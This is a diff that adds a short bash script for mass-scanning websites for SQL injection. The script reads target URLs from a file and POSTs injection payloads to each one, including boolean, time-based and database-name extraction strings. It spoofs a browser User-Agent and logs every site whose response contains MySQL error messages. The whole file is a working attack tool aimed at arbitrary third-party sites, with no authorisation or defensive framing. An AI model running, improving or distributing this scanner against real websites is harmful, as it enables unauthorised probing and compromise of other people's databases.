@@ -1,0 +1,27 @@
+#!/bin/bash
+
+# define the payloads and error messages
+payloads=("1' OR 1=1 -- -" "' OR '1'='1" "1' AND SLEEP(2)" "1' AND 1=(SELECT COUNT(*) FROM users)" "1' AND 1=(SELECT ASCII(SUBSTR((SELECT database()),1,1)))")
+error_msgs=("You have an error in your SQL syntax" "MySQL server version for the right syntax to use near" "Query failed" "SQL query failed" "mysql_fetch_array() expects parameter 1 to be resource")
+
+# read the list of websites from a file
+websites_file="websites.txt"
+if [ -f "$websites_file" ]; then
+  echo "Scanning websites from $websites_file"
+  while read -r website; do
+    echo "Testing $website"
+    for payload in "${payloads[@]}"; do
+      for error_msg in "${error_msgs[@]}"; do
+        if curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -H "Referer: http://localhost/" -X POST -d "id=$payload" "$website" | grep -q "$error_msg"; then
+          echo "Vulnerable website found: $website"
+          echo "Payload used: $payload"
+          echo "Error message received: $error_msg"
+          echo "----------------------------------------------"
+          echo "$website | Payload: $payload | Error Message: $error_msg" >> vulnerable_websites.txt
+        fi
+      done
+    done
+  done < "$websites_file"
+else
+  echo "Could not find websites file: $websites_file"
+fi
